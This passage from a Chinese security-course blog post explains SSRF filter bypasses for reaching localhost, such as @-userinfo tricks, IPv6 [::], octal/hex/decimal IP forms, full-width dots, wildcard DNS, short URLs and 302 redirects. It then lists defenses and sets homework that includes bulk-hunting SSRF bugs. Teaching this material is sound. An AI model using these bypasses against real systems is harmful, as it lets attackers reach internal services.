+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://abc@127.0.0.1</span><br><span class="line">实际上是以用户名abc连接到站点127.0.0.1，同理</span><br><span class="line">http://8.8.8.8@127.0.0.1:8080、http://127.0.0.1#8.8.8.8</span><br><span class="line"></span><br><span class="line">在对@解析域名中，不同的处理函数存在处理差异，如：</span><br><span class="line">http://www.aaa.com@www.bbb.com@www.ccc.com</span><br><span class="line">在PHP的parse_url中会识别www.ccc.com，而libcurl则识别为www.bbb.com</span><br></pre></td></tr></table></figure>
+<p>方法二：“[::]”</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">可以利用[::]来绕过localhost</span><br><span class="line">http://[::]:80/  &gt;&gt;&gt;  http://127.0.0.1</span><br></pre></td></tr></table></figure>
+<p>方法三：添加端口号</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8080</span><br></pre></td></tr></table></figure>
+<p>方法四：利用短网址</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">站长工具短网址/百度短网址</span><br></pre></td></tr></table></figure>
+<p>方法五：利用特殊域名</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">原理是DNS解析。xip.io可以指向任意域名，即127.0.0.1.xip.io，可解析为127.0.0.1</span><br></pre></td></tr></table></figure>
+<p>方法六：利用 DNS 解析…</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在域名上设置A记录，指向127.0.0.1</span><br></pre></td></tr></table></figure>
+<p>方法七：利用进制转换…</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1</span><br><span class="line">八进制：0177.0.0.1</span><br><span class="line">十六进制：0x7f.0.0.1</span><br><span class="line">十进制：2130706433</span><br></pre></td></tr></table></figure>
+<p>方法八：句号</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127。0。0。1  &gt;&gt;&gt;  127.0.0.1</span><br></pre></td></tr></table></figure>
+<p>方法九：302 跳转</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用https://tinyurl.com生成302跳转地址</span><br></pre></td></tr></table></figure>
+<h3 id="漏洞防御"><a class="markdownIt-Anchor" href="#漏洞防御">#</a> 》》》漏洞防御《《《</h3>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. 禁止跳转；</span><br><span class="line">2. 限制请求的端口为 http 常用的端口，比如 80、443、8080、8090； </span><br><span class="line">3. 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态；</span><br><span class="line">4. 设置 URL 白名单或者限制内网 IP（使用 gethostbyname()判断是否为内网 IP）；</span><br><span class="line">5. 禁用不需要的协议，仅仅允许 http 和 https 请求。可以防止类似于 file://, gopher://, ftp:// 等引 起的问题；</span><br><span class="line">6. 过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果 web 应用是去获取某一种类型的 文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准；</span><br></pre></td></tr></table></figure>
+<p>参考文档…</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://xz.aliyun.com/t/6235#toc-9</span><br><span class="line">https://blog.csdn.net/lhh134/article/details/88298881</span><br><span class="line">https://blog.csdn.net/csdnnews/article/details/106726458</span><br><span class="line">https://as1def.github.io/2020/10/10/weblogic-SSRF-CVE-2014-4210/</span><br></pre></td></tr></table></figure>
+<h1 id="五扩展文档"><a class="markdownIt-Anchor" href="#五扩展文档">#</a> 五：扩展文档</h1>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#某scms代码审计-PHP</span><br><span class="line">https://xz.aliyun.com/t/10929</span><br><span class="line">#审计挖掘---CNVD通用漏洞</span><br><span class="line">https://xz.aliyun.com/t/10042</span><br><span class="line">#分析Emissary 的SSRF漏洞(CVE-2021-32639)</span><br><span class="line">https://xz.aliyun.com/t/10045</span><br></pre></td></tr></table></figure>
+<h1 id="六今日作业"><a class="markdownIt-Anchor" href="#六今日作业">#</a> 六：今日作业</h1>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.熟练掌握SSRF漏洞原理及攻击方式</span><br><span class="line">2.完成文档中的CVE漏洞复现并截图</span><br><span class="line">3.阅读扩展文档中的文章并总结于博客</span><br><span class="line">4.尝试批量挖掘SSRF漏洞....</span><br></pre></td></tr></table></figure>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">更新于</span>
+    <time title="修改时间：2022-03-08 09:55:19" itemprop="dateModified" datetime="2022-03-08T09:55:19+08:00">2022-03-08</time>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> 赞赏</button>
+  <p>请我喝[茶]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt="John Doe 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt="John Doe 支付宝">
+        <p>支付宝</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/paypal.png" alt="John Doe 贝宝">
+        <p>贝宝</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>本文作者： </strong>John Doe <i class="ic i-at"><em>@</em></i>Hexo
+  </li>
+  <li class="link">
+    <strong>本文链接：</strong>
+    <a href="https://sun-spots.github.io/2022/03/08/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%B8%89%E5%91%A8/SSRF/" title="">https://sun-spots.github.io/2022/03/08/信息安全/第二阶段/第三周/SSRF/</a>
+  </li>
+  <li class="license">
+    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2022/03/04/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%BA%8C%E5%91%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclxp31goj20zk0m8qv5.jpg" title="未命名">
+  <span class="type">上一篇</span>
+  <span class="category"><i class="ic i-flag"></i> </span>
+  <h3>未命名</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+      
+
+  <a href="/2022/03/08/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%B8%89%E5%91%A8/XXE/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gicivghyooj20zk0m8dir.jpg" title="未命名">
+  <span class="type">下一篇</span>
+  <span class="category"><i class="ic i-flag"></i> </span>
+  <h3>未命名</h3>
+  </a>
+
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="文章目录">
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE"><span class="toc-number">1.</span> <span class="toc-text"> 一：知识回顾</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8Cssrf%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.</span> <span class="toc-text"> 二：SSRF 漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">2.0.1.</span> <span class="toc-text"> 》》》漏洞原理《《《</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AB%98%E5%8D%B1%E5%87%BD%E6%95%B0"><span class="toc-number">2.0.2.</span> <span class="toc-text"> 》》》高危函数《《《</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="toc-number">2.0.3.</span> <span class="toc-text"> 》》》攻击方式《《《</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E5%BA%94%E7%94%A8%E6%94%BB%E5%87%BB"><span class="toc-number">3.</span> <span class="toc-text"> 三：应用攻击</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E6%8C%96%E6%8E%98%E9%98%B2%E5%BE%A1"><span class="toc-number">4.</span> <span class="toc-text"> 四：挖掘防御</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%A7%8D%E7%B1%BB"><span class="toc-number">4.0.1.</span> <span class="toc-text"> 》》》漏洞种类《《《</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E6%98%BE%E7%A4%BA%E5%93%8D%E5%BA%94"><span class="toc-number">4.0.1.1.</span> <span class="toc-text"> 1. 显示响应</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E4%B8%8D%E6%98%BE%E7%A4%BA%E5%93%8D%E5%BA%94"><span class="toc-number">4.0.1.2.</span> <span class="toc-text"> 2. 不显示响应</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3semi-ssrf"><span class="toc-number">4.0.1.3.</span> <span class="toc-text"> 3.Semi-SSRF</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="toc-number">4.0.2.</span> <span class="toc-text"> 》》》漏洞挖掘《《《</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#img"><span class="toc-number">4.0.3.</span> <span class="toc-text"> </span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E4%BB%8Eweb%E5%8A%9F%E8%83%BD%E5%AF%BB%E6%89%BE"><span class="toc-number">4.0.3.1.</span> <span class="toc-text"> 一：从 WEB 功能寻找</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E4%BB%8Eurl%E5%85%B3%E9%94%AE%E5%AD%97%E5%AF%BB%E6%89%BE"><span class="toc-number">4.0.3.2.</span> <span class="toc-text"> 二：从 URL 关键字寻找</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87"><span class="toc-number">4.0.4.</span> <span class="toc-text"> 》》》漏洞绕过《《《</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%98%B2%E5%BE%A1"><span class="toc-number">4.0.5.</span> <span class="toc-text"> 》》》漏洞防御《《《</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%94%E6%89%A9%E5%B1%95%E6%96%87%E6%A1%A3"><span class="toc-number">5.</span> <span class="toc-text"> 五：扩展文档</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AD%E4%BB%8A%E6%97%A5%E4%BD%9C%E4%B8%9A"><span class="toc-number">6.</span> <span class="toc-text"> 六：今日作业</span></a></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="系列文章">
+      </div>
+      <div class="overview panel" data-title="站点概览">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="John Doe"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">John Doe</p>
+  <div class="description" itemprop="description"></div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">37</span>
+        <span class="name">文章</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">3</span>
+        <span class="name">分类</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
+  </li>
+
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+        <a href="/2022/03/04/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%BA%8C%E5%91%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+        <a href="/2022/03/08/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%B8%89%E5%91%A8/XXE/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>随机文章</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/01/20/%E4%BF%AE%E6%94%B9/%E6%B5%AE%E5%8A%A8/" title="未命名">未命名</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/03/04/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%B8%80%E5%91%A8/%E8%B5%84%E4%BA%A7%E6%90%9C%E9%9B%86/" title="未命名">未命名</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/03/04/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%B8%80%E5%91%A8/BurpSuite%E4%BD%BF%E7%94%A8/" title="未命名">未命名</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/03/09/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%B8%89%E5%91%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E4%B8%8E%E9%98%B2%E7%81%AB%E5%A2%99/" title="未命名">未命名</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E2%80%94%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/" title="分类于 信息安全—网络渗透">信息安全—网络渗透</a>
+</div>
+
+    <span><a href="/2022/01/10/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%B8%80%E5%91%A8/1.1%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/" title="计算机的基本概念">计算机的基本概念</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/web/" title="分类于 web前端">web前端</a>
+</div>
+
+    <span><a href="/2022/01/14/%E4%BF%AE%E6%94%B9/css%E6%A0%B7%E5%BC%8F%E3%80%81%E7%BB%A7%E6%89%BF%E3%80%81%E6%9D%83%E9%87%8D/" title="css样式、继承、权重">css样式、继承、权重</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/01/19/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E5%B8%B8%E7%94%A8%E7%9F%A5%E8%AF%86/MSSQL%E5%AE%89%E8%A3%85/" title="未命名">未命名</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/03/02/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%BA%8C%E5%91%A8/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/" title="未命名">未命名</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/01/21/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%BA%8C%E5%91%A8/2.5%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%AE%A1%E7%90%86/" title="未命名">未命名</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/03/08/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%B8%89%E5%91%A8/XXE/" title="未命名">未命名</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>最新评论</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2022</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">John Doe @ Yume Shoka</span>
+  </div>
+  <div class="powered-by">
+    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2022/03/08/信息安全/第二阶段/第三周/SSRF/',
+    favicon: {
+      show: "（●´3｀●）やれやれだぜ",
+      hide: "(´Д｀)大変だ！"
+    },
+    search : {
+      placeholder: "文章搜索",
+      empty: "关于 「 ${query} 」，什么也没搜到",
+      stats: "${time} ms 内找到 ${hits} 条结果"
+    },
+    valine: true,fancybox: true,
+    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
